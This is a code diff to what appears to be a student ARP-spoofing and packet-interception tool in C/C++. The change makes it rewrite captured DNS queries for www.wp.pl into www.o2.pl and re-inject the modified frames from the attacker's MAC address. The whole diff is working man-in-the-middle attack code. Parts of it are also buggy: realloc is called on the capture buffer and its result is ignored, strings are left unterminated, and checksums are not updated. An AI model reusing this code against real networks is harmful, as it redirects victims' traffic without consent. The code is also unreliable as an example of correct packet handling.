@@ -8,6 +8,7 @@
 
 
 #include "helper.h"
+#include "string.h"
 
 void spoof(const char *interface_name, char *address) {
     u_int32_t target_ip_addr, zero_ip_addr;
@@ -45,6 +46,9 @@ void spoof(const char *interface_name, char *address) {
 }
 
 void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *frame) {
+
+    size_t frame_size = h->caplen;
+
     int sfd_send;
     struct sockaddr_ll sall_send;
     struct ifreq interface_struct;          // interface structure -> needed for interface identification
@@ -61,27 +65,77 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *frame) {
     sall_send.sll_halen = ETH_ALEN;
 
     struct ethhdr *eth_hdr = (struct ethhdr *) frame;
+    int header_size = sizeof(struct ethhdr);
+
+    printFromToInfo(eth_hdr);
+    printf("MESSAGE RECEIVED: \n");
+    for (int i = 0; i < frame_size; i++) {
+        if (i == 43) {
+            printf(" -> ");
+        }
+        printf("%x ", frame[i]);
+    }
+    printf("\n");
 
     if (ntohs(eth_hdr->h_proto) == ETH_P_IP) {
-        struct iphdr *ip_hdr = (struct iphdr *) (frame + sizeof(struct ethhdr));
+        struct iphdr *ip_hdr = (struct iphdr *) (frame + header_size);
+        header_size += sizeof(struct iphdr);
         unsigned int ip_size = ntohs(ip_hdr->tot_len);    // h->caplen - sizeof(struct ethhdr) which is 14
         if (ip_hdr->protocol == 0x11) {
-            struct udphdr *udp_hdr = (struct udphdr *) (frame + sizeof(struct ethhdr) + sizeof(struct iphdr));
+            struct udphdr *udp_hdr = (struct udphdr *) (frame + header_size);
+            header_size += sizeof(struct udphdr);
             uint16_t port = ntohs(udp_hdr->dest);
             unsigned int udp_size = ntohs(udp_hdr->len);
             if (port == 53) {
                 unsigned int dns_size = udp_size - sizeof(struct udphdr);
-                std::cout << "FRAME_SIZE=" << h->caplen << ", (-14)IP_SIZE=" <<
+                std::cout << "FRAME_SIZE=" << frame_size << ", (-14)IP_SIZE=" <<
                           ip_size << ", (-20)UDP_SIZE=" << udp_size << ", (-8)DNS_SIZE=" << dns_size << "\n";
-                printFromToInfo(eth_hdr);
                 if (dns_size > 0) {
-                    struct DNS_HEADER *dns_header = (struct DNS_HEADER *) (udp_hdr + sizeof(struct udphdr));
+                    struct DNS_HEADER *dns_header = (struct DNS_HEADER *) (frame + header_size);
+                    header_size += sizeof(struct DNS_HEADER);
                     // TODO checking DNS_header flags and questNo?
-                    char *dns_query = (char *) (frame + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct DNS_HEADER));
+
+                    char *dns_query = (char *) (frame + header_size);
                     int dns_query_size = dns_size - sizeof(struct DNS_HEADER) - sizeof(struct QUESTION);    // QUESTION = 2*2B at the end
-                    unsigned char questionedAddress[dns_query_size];
+                    char questionedAddress[dns_query_size];
                     strncpy(reinterpret_cast<char *>(questionedAddress), dns_query, static_cast<size_t>(dns_query_size));
-                    printf("DNS QUERY = %s\n\n", questionedAddress);
+
+                    char cmp_questioned_address[] = " www.wp.pl";
+                    cmp_questioned_address[0] = 3;
+                    cmp_questioned_address[4] = 2;
+                    cmp_questioned_address[7] = 2;
+
+                    if (strcmp(questionedAddress, cmp_questioned_address) == 0) {
+                        char new_questioned_address[] = " www.o2.pl";
+                        new_questioned_address[0] = 3;
+                        new_questioned_address[4] = 2;
+                        new_questioned_address[7] = 2;
+                        size_t new_dns_query_size = strlen(new_questioned_address) - 1;
+
+
+                        frame_size = header_size + new_dns_query_size + sizeof(struct QUESTION);
+
+                        ip_hdr->tot_len = htons(static_cast<uint16_t>(frame_size - sizeof(struct ethhdr)));
+                        udp_hdr->len = htons(static_cast<uint16_t>(frame_size - sizeof(struct ethhdr) - sizeof(struct iphdr)));
+
+                        if (new_dns_query_size > dns_query_size) {
+                            realloc((void *) frame, frame_size);
+                        }
+                        dns_query = (char *) (frame + header_size); // TODO chyba potrzebne?
+                        memcpy(dns_query + new_dns_query_size, dns_query + dns_query_size, sizeof(struct QUESTION));
+                        memcpy(dns_query, new_questioned_address, new_dns_query_size);
+
+                        printf("MESSAGE SEND: \n");
+                        for (int i = 0; i < frame_size; i++) {
+                            if (i == 43) {
+                                printf(" -> ");
+                            }
+                            printf("%x ", frame[i]);
+                        }
+                        printf("\n");
+
+                    }
+
                 }
             }
         }
@@ -96,7 +150,7 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *frame) {
     // Change source address to this computer MAC
     ioctl(sfd_send, SIOCGIFHWADDR, &interface_struct);
     memcpy(eth_hdr->h_source, &interface_struct.ifr_hwaddr.sa_data, ETH_ALEN);
-    if (sendto(sfd_send, frame, (int) (h->caplen), 0, (struct sockaddr *) &sall_send, sizeof(struct sockaddr_ll)) < 0) {
+    if (sendto(sfd_send, frame, (int) (frame_size), 0, (struct sockaddr *) &sall_send, sizeof(struct sockaddr_ll)) < 0) {
         printf("Error while sending: %s\n", strerror(errno));
     }
 
